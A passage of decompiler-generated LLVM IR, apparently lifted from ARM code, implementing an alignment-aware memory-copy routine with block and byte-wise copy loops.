  %v6_153b0 = icmp slt i32 %v5_153b0, 0
  store i1 %v6_153b0, i1* %cpsr_v.global-to-local, align 1
  %v7_153b0 = icmp slt i32 %v2_153b0, 0
  store i1 %v7_153b0, i1* %cpsr_n.global-to-local, align 1
  %v8_153b0 = icmp eq i32 %v0_153b0, 4
  store i1 %v8_153b0, i1* %cpsr_z.global-to-local, align 1
  %v5_153b4 = icmp slt i32 %v0_153b0, 4
  br i1 %v5_153b4, label %bb140, label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %bb
  %v1_153b8 = urem i32 %v1_153a0, 4
  store i32 %v1_153b8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_153b8 = icmp eq i32 %v1_153b8, 0
  store i1 %v2_153b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153b8, label %dec_label_pc_153c0, label %dec_label_pc_1546c

dec_label_pc_153c0:                               ; preds = %dec_label_pc_153b8
  %v1_153c0 = urem i32 %v0_153a0, 4
  store i32 %v1_153c0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_153c0 = icmp eq i32 %v1_153c0, 0
  store i1 %v2_153c0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_153a0 to i2
  br i1 %v2_153c0, label %dec_label_pc_153c8, label %dec_label_pc_1549c

dec_label_pc_153c8:                               ; preds = %dec_label_pc_153c0, %dec_label_pc_15494
  %v0_153e094 = phi i32 [ %v1_153a0, %dec_label_pc_153c0 ], [ %v0_155bc77, %dec_label_pc_15494 ]
  %v0_153dc93 = phi i32 [ %v0_153a0, %dec_label_pc_153c0 ], [ %v0_15494, %dec_label_pc_15494 ]
  %v0_153c8 = phi i32 [ %v2_153b0, %dec_label_pc_153c0 ], [ %v2_1548c, %dec_label_pc_15494 ]
  %v1_153c8 = add i32 %v0_153c8, -8
  store i32 %v1_153c8, i32* %r2.global-to-local, align 4
  %v3_153c8 = sub i32 7, %v0_153c8
  %v4_153c8 = and i32 %v3_153c8, %v0_153c8
  %v5_153c8 = icmp slt i32 %v4_153c8, 0
  store i1 %v5_153c8, i1* %cpsr_v.global-to-local, align 1
  %v6_153c8 = icmp slt i32 %v1_153c8, 0
  store i1 %v6_153c8, i1* %cpsr_n.global-to-local, align 1
  %v7_153c8 = icmp eq i32 %v0_153c8, 8
  store i1 %v7_153c8, i1* %cpsr_z.global-to-local, align 1
  %v2_153cc = xor i1 %v6_153c8, %v5_153c8
  br i1 %v2_153cc, label %dec_label_pc_1541c, label %dec_label_pc_153d0

dec_label_pc_153d0:                               ; preds = %dec_label_pc_153c8
  %v1_153d0 = add i32 %v0_153c8, -28
  store i32 %v1_153d0, i32* %r2.global-to-local, align 4
  %v3_153d0 = sub i32 27, %v0_153c8
  %v4_153d0 = and i32 %v3_153d0, %v1_153c8
  %v5_153d0 = icmp slt i32 %v4_153d0, 0
  store i1 %v5_153d0, i1* %cpsr_v.global-to-local, align 1
  %v6_153d0 = icmp slt i32 %v1_153d0, 0
  store i1 %v6_153d0, i1* %cpsr_n.global-to-local, align 1
  %v7_153d0 = icmp eq i32 %v1_153c8, 20
  store i1 %v7_153d0, i1* %cpsr_z.global-to-local, align 1
  %v2_153d4 = xor i1 %v6_153d0, %v5_153d0
  br i1 %v2_153d4, label %dec_label_pc_15408, label %dec_label_pc_153d8

dec_label_pc_153d8:                               ; preds = %dec_label_pc_153d0
  %v0_153d8 = load i32, i32* @r4, align 4
  store i32 %v0_153d8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_153dc

dec_label_pc_153dc:                               ; preds = %dec_label_pc_153dc.dec_label_pc_153dc_crit_edge, %dec_label_pc_153d8
  %v0_153e0 = phi i32 [ %v12_153e8, %dec_label_pc_153dc.dec_label_pc_153dc_crit_edge ], [ %v0_153e094, %dec_label_pc_153d8 ]
  %v0_153dc = phi i32 [ %v0_153dc.pre, %dec_label_pc_153dc.dec_label_pc_153dc_crit_edge ], [ %v0_153dc93, %dec_label_pc_153d8 ]
  %v1_153dc = inttoptr i32 %v0_153dc to i32*
  %v2_153dc = load i32, i32* %v1_153dc, align 4
  %v3_153dc = add i32 %v0_153dc, 4
  %v4_153dc = inttoptr i32 %v3_153dc to i32*
  %v5_153dc = load i32, i32* %v4_153dc, align 4
  store i32 %v5_153dc, i32* %r4.global-to-local, align 4
  %v6_153dc = add i32 %v0_153dc, 8
  %v7_153dc = inttoptr i32 %v6_153dc to i32*
  %v8_153dc = load i32, i32* %v7_153dc, align 4
  store i32 %v8_153dc, i32* %ip.global-to-local, align 4
  %v9_153dc = add i32 %v0_153dc, 12
  %v10_153dc = inttoptr i32 %v9_153dc to i32*
  %v11_153dc = load i32, i32* %v10_153dc, align 4
  store i32 %v11_153dc, i32* %lr.global-to-local, align 4
  %v12_153dc = add i32 %v0_153dc, 16
  store i32 %v12_153dc, i32* %r1.global-to-local, align 4
  %v1_153e0 = inttoptr i32 %v0_153e0 to i32*
  store i32 %v2_153dc, i32* %v1_153e0, align 4
  %v3_153e0 = add i32 %v0_153e0, 4
  %v4_153e0 = inttoptr i32 %v3_153e0 to i32*
  %v5_153e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_153e0, i32* %v4_153e0, align 4
  %v6_153e0 = add i32 %v0_153e0, 8
  %v7_153e0 = inttoptr i32 %v6_153e0 to i32*
  %v8_153e0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_153e0, i32* %v7_153e0, align 4
  %v9_153e0 = add i32 %v0_153e0, 12
  %v10_153e0 = inttoptr i32 %v9_153e0 to i32*
  %v11_153e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_153e0, i32* %v10_153e0, align 4
  %v12_153e0 = add i32 %v0_153e0, 16
  store i32 %v12_153e0, i32* %r0.global-to-local, align 4
  %v0_153e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_153e4 = inttoptr i32 %v0_153e4 to i32*
  %v2_153e4 = load i32, i32* %v1_153e4, align 4
  store i32 %v2_153e4, i32* @r3, align 4
  %v3_153e4 = add i32 %v0_153e4, 4
  %v4_153e4 = inttoptr i32 %v3_153e4 to i32*
  %v5_153e4 = load i32, i32* %v4_153e4, align 4
  store i32 %v5_153e4, i32* %r4.global-to-local, align 4
  %v6_153e4 = add i32 %v0_153e4, 8
  %v7_153e4 = inttoptr i32 %v6_153e4 to i32*
  %v8_153e4 = load i32, i32* %v7_153e4, align 4
  store i32 %v8_153e4, i32* @ip, align 4
  %v9_153e4 = add i32 %v0_153e4, 12
  %v10_153e4 = inttoptr i32 %v9_153e4 to i32*
  %v11_153e4 = load i32, i32* %v10_153e4, align 4
  store i32 %v11_153e4, i32* %lr.global-to-local, align 4
  %v12_153e4 = add i32 %v0_153e4, 16
  store i32 %v12_153e4, i32* @r1, align 4
  %v1_153e8 = inttoptr i32 %v12_153e0 to i32*
  store i32 %v2_153e4, i32* %v1_153e8, align 4
  %v3_153e8 = add i32 %v0_153e0, 20
  %v4_153e8 = inttoptr i32 %v3_153e8 to i32*
  %v5_153e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_153e8, i32* %v4_153e8, align 4
  %v6_153e8 = add i32 %v0_153e0, 24
  %v7_153e8 = inttoptr i32 %v6_153e8 to i32*
  %v8_153e8 = load i32, i32* @ip, align 4
  store i32 %v8_153e8, i32* %v7_153e8, align 4
  %v9_153e8 = add i32 %v0_153e0, 28
  %v10_153e8 = inttoptr i32 %v9_153e8 to i32*
  %v11_153e8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_153e8, i32* %v10_153e8, align 4
  %v12_153e8 = add i32 %v0_153e0, 32
  store i32 %v12_153e8, i32* @r0, align 4
  %v0_153ec = load i32, i32* %r2.global-to-local, align 4
  %v1_153ec = add i32 %v0_153ec, -32
  store i32 %v1_153ec, i32* %r2.global-to-local, align 4
  %v3_153ec = sub i32 31, %v0_153ec
  %v4_153ec = and i32 %v3_153ec, %v0_153ec
  %v5_153ec = icmp slt i32 %v4_153ec, 0
  %v6_153ec = icmp slt i32 %v1_153ec, 0
  %v2_153f0 = xor i1 %v6_153ec, %v5_153ec
  br i1 %v2_153f0, label %dec_label_pc_153f4, label %dec_label_pc_153dc.dec_label_pc_153dc_crit_edge

dec_label_pc_153dc.dec_label_pc_153dc_crit_edge:  ; preds = %dec_label_pc_153dc
  %v0_153dc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_153dc

dec_label_pc_153f4:                               ; preds = %dec_label_pc_153dc
  %v1_153f4 = add i32 %v0_153ec, -16
  %v3_153f4 = add i32 %v0_153ec, 2147483616
  %v4_153f4 = and i32 %v1_153f4, %v3_153f4
  %v5_153f4 = icmp slt i32 %v4_153f4, 0
  store i1 %v5_153f4, i1* %cpsr_v.global-to-local, align 1
  %v6_153f4 = icmp slt i32 %v1_153f4, 0
  store i1 %v6_153f4, i1* %cpsr_n.global-to-local, align 1
  %v7_153f4 = icmp eq i32 %v1_153f4, 0
  store i1 %v7_153f4, i1* %cpsr_z.global-to-local, align 1
  %v2_153f8 = xor i1 %v6_153f4, %v5_153f4
  br i1 %v2_153f8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_153f4
  %v3_153f8 = load i32, i32* @r1, align 4
  %v4_153f8 = inttoptr i32 %v3_153f8 to i32*
  %v5_153f8 = load i32, i32* %v4_153f8, align 4
  store i32 %v5_153f8, i32* @r3, align 4
  %v6_153f8 = add i32 %v3_153f8, 4
  %v7_153f8 = inttoptr i32 %v6_153f8 to i32*
  %v8_153f8 = load i32, i32* %v7_153f8, align 4
  store i32 %v8_153f8, i32* %r4.global-to-local, align 4
  %v9_153f8 = add i32 %v3_153f8, 8
  %v10_153f8 = inttoptr i32 %v9_153f8 to i32*
  %v11_153f8 = load i32, i32* %v10_153f8, align 4
  store i32 %v11_153f8, i32* @ip, align 4
  %v12_153f8 = add i32 %v3_153f8, 12
  %v13_153f8 = inttoptr i32 %v12_153f8 to i32*
  %v14_153f8 = load i32, i32* %v13_153f8, align 4
  store i32 %v14_153f8, i32* %lr.global-to-local, align 4
  %v15_153f8 = add i32 %v3_153f8, 16
  store i32 %v15_153f8, i32* @r1, align 4
  %v4_153fc = inttoptr i32 %v12_153e8 to i32*
  store i32 %v5_153f8, i32* %v4_153fc, align 4
  %v6_153fc = add i32 %v0_153e0, 36
  %v7_153fc = inttoptr i32 %v6_153fc to i32*
  %v8_153fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_153fc, i32* %v7_153fc, align 4
  %v9_153fc = add i32 %v0_153e0, 40
  %v10_153fc = inttoptr i32 %v9_153fc to i32*
  %v11_153fc = load i32, i32* @ip, align 4
  store i32 %v11_153fc, i32* %v10_153fc, align 4
  %v12_153fc = add i32 %v0_153e0, 44
  %v13_153fc = inttoptr i32 %v12_153fc to i32*
  %v14_153fc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_153fc, i32* %v13_153fc, align 4
  %v15_153fc = add i32 %v0_153e0, 48
  store i32 %v15_153fc, i32* @r0, align 4
  %v3_15400 = load i32, i32* %r2.global-to-local, align 4
  %v4_15400 = add i32 %v3_15400, -16
  store i32 %v4_15400, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_153f4, %bb136
  %v3_15410102111 = phi i32 [ %v15_153fc, %bb136 ], [ %v12_153e8, %dec_label_pc_153f4 ]
  %v0_15408.pre = phi i32 [ %v4_15400, %bb136 ], [ %v1_153ec, %dec_label_pc_153f4 ]
  %v2_15404 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15404, i32* @r4, align 4
  br label %dec_label_pc_15408

dec_label_pc_15408:                               ; preds = %dec_label_pc_153d0, %bb137
  %v3_15410101 = phi i32 [ %v0_153e094, %dec_label_pc_153d0 ], [ %v3_15410102111, %bb137 ]
  %v0_15408 = phi i32 [ %v1_153d0, %dec_label_pc_153d0 ], [ %v0_15408.pre, %bb137 ]
  %v1_15408 = add i32 %v0_15408, 20
  store i32 %v1_15408, i32* %r2.global-to-local, align 4
  %v3_15408 = sub i32 0, %v0_15408
  %v4_15408 = and i32 %v1_15408, %v3_15408
  %v5_15408 = icmp slt i32 %v4_15408, 0
  store i1 %v5_15408, i1* %cpsr_v.global-to-local, align 1
  %v6_15408 = icmp slt i32 %v1_15408, 0
  store i1 %v6_15408, i1* %cpsr_n.global-to-local, align 1
  %v7_15408 = icmp eq i32 %v1_15408, 0
  store i1 %v7_15408, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %.thread115, %dec_label_pc_15408
  %v0_1541c.pre157 = phi i32 [ %v0_1541c.pre, %.thread115 ], [ %v1_15408, %dec_label_pc_15408 ]
  %v3_15410 = phi i32 [ %v3_1541099116, %.thread115 ], [ %v3_15410101, %dec_label_pc_15408 ]
  %v1_15414 = phi i1 [ %v1_15418, %.thread115 ], [ %v5_15408, %dec_label_pc_15408 ]
  %v0_15414 = phi i1 [ %v0_15418, %.thread115 ], [ %v6_15408, %dec_label_pc_15408 ]
  %v2_1540c = xor i1 %v1_15414, %v0_15414
  br i1 %v2_1540c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1540c
  %v3_1540c = load i32, i32* @r1, align 4
  %v4_1540c = inttoptr i32 %v3_1540c to i32*
  %v5_1540c = load i32, i32* %v4_1540c, align 4
  store i32 %v5_1540c, i32* @r3, align 4
  %v6_1540c = add i32 %v3_1540c, 4
  %v7_1540c = inttoptr i32 %v6_1540c to i32*
  %v8_1540c = load i32, i32* %v7_1540c, align 4
  store i32 %v8_1540c, i32* @ip, align 4
  %v9_1540c = add i32 %v3_1540c, 8
  %v10_1540c = inttoptr i32 %v9_1540c to i32*
  %v11_1540c = load i32, i32* %v10_1540c, align 4
  store i32 %v11_1540c, i32* %lr.global-to-local, align 4
  %v12_1540c = add i32 %v3_1540c, 12
  store i32 %v12_1540c, i32* @r1, align 4
  %v4_15410 = inttoptr i32 %v3_15410 to i32*
  store i32 %v5_1540c, i32* %v4_15410, align 4
  %v6_15410 = add i32 %v3_15410, 4
  %v7_15410 = inttoptr i32 %v6_15410 to i32*
  %v8_15410 = load i32, i32* @ip, align 4
  store i32 %v8_15410, i32* %v7_15410, align 4
  %v9_15410 = add i32 %v3_15410, 8
  %v10_15410 = inttoptr i32 %v9_15410 to i32*
  %v11_15410 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_15410, i32* %v10_15410, align 4
  %v12_15410 = add i32 %v3_15410, 12
  store i32 %v12_15410, i32* @r0, align 4
  %v3_15414 = load i32, i32* %r2.global-to-local, align 4
  %v4_15414 = add i32 %v3_15414, -12
  store i32 %v4_15414, i32* %r2.global-to-local, align 4
  %v6_15414 = sub i32 11, %v3_15414
  %v7_15414 = and i32 %v6_15414, %v3_15414
  %v8_15414 = icmp slt i32 %v7_15414, 0
  store i1 %v8_15414, i1* %cpsr_v.global-to-local, align 1
  %v9_15414 = icmp slt i32 %v4_15414, 0
  store i1 %v9_15414, i1* %cpsr_n.global-to-local, align 1
  %v10_15414 = icmp eq i32 %v3_15414, 12
  store i1 %v10_15414, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1540c, %bb138
  %v0_1541c.pre = phi i32 [ %v4_15414, %bb138 ], [ %v0_1541c.pre157, %dec_label_pc_1540c ]
  %v3_1541099116 = phi i32 [ %v12_15410, %bb138 ], [ %v3_15410, %dec_label_pc_1540c ]
  %v1_15418 = phi i1 [ %v8_15414, %bb138 ], [ %v1_15414, %dec_label_pc_1540c ]
  %v0_15418 = phi i1 [ %v9_15414, %bb138 ], [ %v0_15414, %dec_label_pc_1540c ]
  %v2_15418 = xor i1 %v1_15418, %v0_15418
  br i1 %v2_15418, label %dec_label_pc_1541c, label %dec_label_pc_1540c

dec_label_pc_1541c:                               ; preds = %.thread115, %dec_label_pc_153c8
  %v4_1542c = phi i32 [ %v0_153e094, %dec_label_pc_153c8 ], [ %v3_1541099116, %.thread115 ]
  %v0_1541c = phi i32 [ %v1_153c8, %dec_label_pc_153c8 ], [ %v0_1541c.pre, %.thread115 ]
  %v1_1541c = add i32 %v0_1541c, 8
  store i32 %v1_1541c, i32* %r2.global-to-local, align 4
  %v3_1541c = sub i32 0, %v0_1541c
  %v4_1541c = and i32 %v1_1541c, %v3_1541c
  %v5_1541c = icmp slt i32 %v4_1541c, 0
  store i1 %v5_1541c, i1* %cpsr_v.global-to-local, align 1
  %v6_1541c = icmp slt i32 %v1_1541c, 0
  store i1 %v6_1541c, i1* %cpsr_n.global-to-local, align 1
  %v7_1541c = icmp eq i32 %v1_1541c, 0
  store i1 %v7_1541c, i1* %cpsr_z.global-to-local, align 1
  %v2_15420 = xor i1 %v6_1541c, %v5_1541c
  br i1 %v2_15420, label %bb140, label %dec_label_pc_15424

dec_label_pc_15424:                               ; preds = %dec_label_pc_1541c
  %v1_15424 = add i32 %v0_1541c, 4
  store i32 %v1_15424, i32* %r2.global-to-local, align 4
  %v3_15424 = sub i32 -5, %v0_1541c
  %v4_15424 = and i32 %v3_15424, %v1_1541c
  %v5_15424 = icmp slt i32 %v4_15424, 0
  store i1 %v5_15424, i1* %cpsr_v.global-to-local, align 1
  %v6_15424 = icmp slt i32 %v1_15424, 0
  store i1 %v6_15424, i1* %cpsr_n.global-to-local, align 1
  %v7_15424 = icmp eq i32 %v1_1541c, 4
  store i1 %v7_15424, i1* %cpsr_z.global-to-local, align 1
  %v2_15428 = xor i1 %v6_15424, %v5_15424
  %v3_15428 = load i32, i32* @r1, align 4
  %v4_15428 = inttoptr i32 %v3_15428 to i32*
  %v5_15428 = load i32, i32* %v4_15428, align 4
  store i32 %v5_15428, i32* @r3, align 4
  %v7_15428 = add i32 %v3_15428, 4
  br i1 %v2_15428, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_15424
  store i32 %v7_15428, i32* @r1, align 4
  %v5_1542c = inttoptr i32 %v4_1542c to i32*
  store i32 %v5_15428, i32* %v5_1542c, align 4
  %v6_1542c = load i32, i32* @r0, align 4
  %v7_1542c = add i32 %v6_1542c, 4
  store i32 %v7_1542c, i32* @r0, align 4
  %v0_1543c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_15424
  %v7_15430 = inttoptr i32 %v7_15428 to i32*
  %v8_15430 = load i32, i32* %v7_15430, align 4
  store i32 %v8_15430, i32* @ip, align 4
  %v9_15430 = add i32 %v3_15428, 8
  store i32 %v9_15430, i32* @r1, align 4
  %v4_15434 = inttoptr i32 %v4_1542c to i32*
  store i32 %v5_15428, i32* %v4_15434, align 4
  %v6_15434 = add i32 %v4_1542c, 4
  %v7_15434 = inttoptr i32 %v6_15434 to i32*
  %v8_15434 = load i32, i32* @ip, align 4
  store i32 %v8_15434, i32* %v7_15434, align 4
  %v9_15434 = add i32 %v4_1542c, 8
  store i32 %v9_15434, i32* @r0, align 4
  %v3_15438 = load i32, i32* %r2.global-to-local, align 4
  %v4_15438 = add i32 %v3_15438, -4
  store i32 %v4_15438, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1541c, %bb, %dec_label_pc_155ec, %dec_label_pc_15580, %dec_label_pc_15514, %bb139
  %v0_1543c = phi i32 [ %v0_1543c.pre, %.thread122 ], [ %v2_1548c, %.thread128 ], [ %v1_1541c, %dec_label_pc_1541c ], [ %v2_153b0, %bb ], [ %v0_1543c61, %dec_label_pc_155ec ], [ %v0_1543c60, %dec_label_pc_15580 ], [ %v0_1543c59, %dec_label_pc_15514 ], [ %v4_15438, %bb139 ]
  %v1_1543c = add i32 %v0_1543c, 4
  store i32 %v1_1543c, i32* %r2.global-to-local, align 4
  %v3_1543c = sub i32 0, %v0_1543c
  %v4_1543c = and i32 %v1_1543c, %v3_1543c
  %v5_1543c = icmp slt i32 %v4_1543c, 0
  store i1 %v5_1543c, i1* %cpsr_v.global-to-local, align 1
  %v6_1543c = icmp slt i32 %v1_1543c, 0
  store i1 %v6_1543c, i1* %cpsr_n.global-to-local, align 1
  %v7_1543c = icmp eq i32 %v1_1543c, 0
  store i1 %v7_1543c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1543c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_15444.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_15440 = load i8*, i8** %stack_var_-8, align 4
  %v4_15440 = ptrtoint i8* %v3_15440 to i32
  store i32 %v4_15440, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_15444 = phi i32 [ %v0_15444.pre, %bb140.bb142_crit_edge ], [ %v8_153ac, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1543c, i32 %v0_15444)
  %v0_15448 = load i32, i32* %r2.global-to-local, align 4
  %v1_15448 = add i32 %v0_15448, -2
  %v3_15448 = sub i32 1, %v0_15448
  %v4_15448 = and i32 %v3_15448, %v0_15448
  %v5_15448 = icmp slt i32 %v4_15448, 0
  store i1 %v5_15448, i1* %cpsr_v.global-to-local, align 1
  %v6_15448 = icmp slt i32 %v1_15448, 0
  store i1 %v6_15448, i1* %cpsr_n.global-to-local, align 1
  %v7_15448 = icmp eq i32 %v0_15448, 2
  store i1 %v7_15448, i1* %cpsr_z.global-to-local, align 1
  %v0_1544c = load i32, i32* @r1, align 4
  %v1_1544c = inttoptr i32 %v0_1544c to i8*
  %v2_1544c = load i8, i8* %v1_1544c, align 1
  %v5_1544c = add i32 %v0_1544c, 1
  store i32 %v5_1544c, i32* %r1.global-to-local, align 4
  %v2_15450 = load i32, i32* @r0, align 4
  %v3_15450 = inttoptr i32 %v2_15450 to i8*
  store i8 %v2_1544c, i8* %v3_15450, align 1
  %v4_15450 = load i32, i32* @r0, align 4
  %v5_15450 = add i32 %v4_15450, 1
  store i32 %v5_15450, i32* %r0.global-to-local, align 4
  %v0_15454 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15454 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15454 = xor i1 %v0_15454, %v1_15454
  br i1 %v2_15454, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_15454 = load i32, i32* %r1.global-to-local, align 4
  %v4_15454 = inttoptr i32 %v3_15454 to i8*
  %v5_15454 = load i8, i8* %v4_15454, align 1
  %v8_15454 = add i32 %v3_15454, 1
  store i32 %v8_15454, i32* %r1.global-to-local, align 4
  %v6_15458 = inttoptr i32 %v5_15450 to i8*
  store i8 %v5_15454, i8* %v6_15458, align 1
  %v7_15458 = load i32, i32* %r0.global-to-local, align 4
  %v8_15458 = add i32 %v7_15458, 1
  store i32 %v8_15458, i32* %r0.global-to-local, align 4
  %v1_1545c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1545c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_15460 = phi i32 [ %v8_15458, %bb143 ], [ %v5_15450, %bb142 ]
  %v2_15460 = phi i1 [ %v2_1545c.pre, %bb143 ], [ %v1_15454, %bb142 ]
  %v1_15460 = phi i1 [ %v1_1545c.pre, %bb143 ], [ %v0_15454, %bb142 ]
  %v0_1545c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1545c = xor i1 %v2_15460, %v1_15460
  %v4_1545c = or i1 %v0_1545c, %v3_1545c
  br i1 %v4_1545c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1545c = load i32, i32* %r1.global-to-local, align 4
  %v6_1545c = inttoptr i32 %v5_1545c to i8*
  %v7_1545c = load i8, i8* %v6_1545c, align 1
  %v10_1545c = add i32 %v5_1545c, 1
  store i32 %v10_1545c, i32* %r1.global-to-local, align 4
  %v8_15460 = inttoptr i32 %v7_15460 to i8*
  store i8 %v7_1545c, i8* %v8_15460, align 1
  %v9_15460 = load i32, i32* %r0.global-to-local, align 4
  %v10_15460 = add i32 %v9_15460, 1
  store i32 %v10_15460, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_15464 = load i8*, i8** %stack_var_-8, align 4
  %v3_15464 = ptrtoint i8* %v2_15464 to i32
  store i32 %v3_15464, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_153ac)
  %v0_1546c.pre = load i32, i32* @ip, align 4
  %v0_15474.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_15478.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1546c

dec_label_pc_1546c:                               ; preds = %dec_label_pc_153b8, %.thread126
  %v2_15478 = phi i32 [ %v1_153a0, %dec_label_pc_153b8 ], [ %v2_15478.pre, %.thread126 ]
  %v0_15474 = phi i32 [ %v0_153a0, %dec_label_pc_153b8 ], [ %v0_15474.pre, %.thread126 ]
  %v0_1546c = phi i32 [ %v1_153b8, %dec_label_pc_153b8 ], [ %v0_1546c.pre, %.thread126 ]
  %v1_1546c = sub i32 4, %v0_1546c
  store i32 %v1_1546c, i32* @ip, align 4
  %v1_15470 = add i32 %v1_1546c, -2
  %v3_15470 = sub i32 1, %v1_1546c
  %v4_15470 = and i32 %v3_15470, %v1_1546c
  %v5_15470 = icmp slt i32 %v4_15470, 0
  store i1 %v5_15470, i1* %cpsr_v.global-to-local, align 1
  %v6_15470 = icmp slt i32 %v1_15470, 0
  store i1 %v6_15470, i1* %cpsr_n.global-to-local, align 1
  %v7_15470 = icmp eq i32 %v1_1546c, 2
  store i1 %v7_15470, i1* %cpsr_z.global-to-local, align 1
  %v1_15474 = inttoptr i32 %v0_15474 to i8*
  %v2_15474 = load i8, i8* %v1_15474, align 1
  %v3_15474 = zext i8 %v2_15474 to i32
  store i32 %v3_15474, i32* @r3, align 4
  %v5_15474 = add i32 %v0_15474, 1
  store i32 %v5_15474, i32* @r1, align 4
  %v3_15478 = inttoptr i32 %v2_15478 to i8*
  store i8 %v2_15474, i8* %v3_15478, align 1
  %v4_15478 = load i32, i32* @r0, align 4
  %v5_15478 = add i32 %v4_15478, 1
  store i32 %v5_15478, i32* @r0, align 4
  %v0_1547c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1547c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1547c = xor i1 %v0_1547c, %v1_1547c
  br i1 %v2_1547c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1546c
  %v3_1547c = load i32, i32* @r1, align 4
  %v4_1547c = inttoptr i32 %v3_1547c to i8*
  %v5_1547c = load i8, i8* %v4_1547c, align 1
  %v6_1547c = zext i8 %v5_1547c to i32
  store i32 %v6_1547c, i32* @r3, align 4
  %v8_1547c = add i32 %v3_1547c, 1
  store i32 %v8_1547c, i32* @r1, align 4
  %v6_15480 = inttoptr i32 %v5_15478 to i8*
  store i8 %v5_1547c, i8* %v6_15480, align 1
  %v7_15480 = load i32, i32* @r0, align 4
  %v8_15480 = add i32 %v7_15480, 1
  store i32 %v8_15480, i32* @r0, align 4
  %v1_15484.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15484.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1546c, %bb145
  %v7_15488 = phi i32 [ %v8_15480, %bb145 ], [ %v5_15478, %dec_label_pc_1546c ]
  %v2_15488 = phi i1 [ %v2_15484.pre, %bb145 ], [ %v1_1547c, %dec_label_pc_1546c ]
  %v1_15488 = phi i1 [ %v1_15484.pre, %bb145 ], [ %v0_1547c, %dec_label_pc_1546c ]
  %v0_15484 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15484 = xor i1 %v2_15488, %v1_15488
  %v4_15484 = or i1 %v0_15484, %v3_15484
  br i1 %v4_15484, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_15484 = load i32, i32* @r1, align 4
  %v6_15484 = inttoptr i32 %v5_15484 to i8*
  %v7_15484 = load i8, i8* %v6_15484, align 1
  %v8_15484 = zext i8 %v7_15484 to i32
  store i32 %v8_15484, i32* @r3, align 4
  %v10_15484 = add i32 %v5_15484, 1
  store i32 %v10_15484, i32* @r1, align 4
  %v8_15488 = inttoptr i32 %v7_15488 to i8*
  store i8 %v7_15484, i8* %v8_15488, align 1
  %v9_15488 = load i32, i32* @r0, align 4
  %v10_15488 = add i32 %v9_15488, 1
  store i32 %v10_15488, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_155bc77 = phi i32 [ %v10_15488, %bb146 ], [ %v7_15488, %.thread127 ]
  %v0_1548c = load i32, i32* %r2.global-to-local, align 4
  %v1_1548c = load i32, i32* @ip, align 4
  %v2_1548c = sub i32 %v0_1548c, %v1_1548c
  store i32 %v2_1548c, i32* %r2.global-to-local, align 4
  %v4_1548c = xor i32 %v1_1548c, %v0_1548c
  %v5_1548c = xor i32 %v2_1548c, %v0_1548c
  %v6_1548c = and i32 %v5_1548c, %v4_1548c
  %v7_1548c = icmp slt i32 %v6_1548c, 0
  store i1 %v7_1548c, i1* %cpsr_v.global-to-local, align 1
  %v8_1548c = icmp slt i32 %v2_1548c, 0
  store i1 %v8_1548c, i1* %cpsr_n.global-to-local, align 1
  %v9_1548c = icmp eq i32 %v0_1548c, %v1_1548c
  store i1 %v9_1548c, i1* %cpsr_z.global-to-local, align 1
  %v2_15490 = xor i1 %v8_1548c, %v7_1548c
  br i1 %v2_15490, label %bb140, label %dec_label_pc_15494

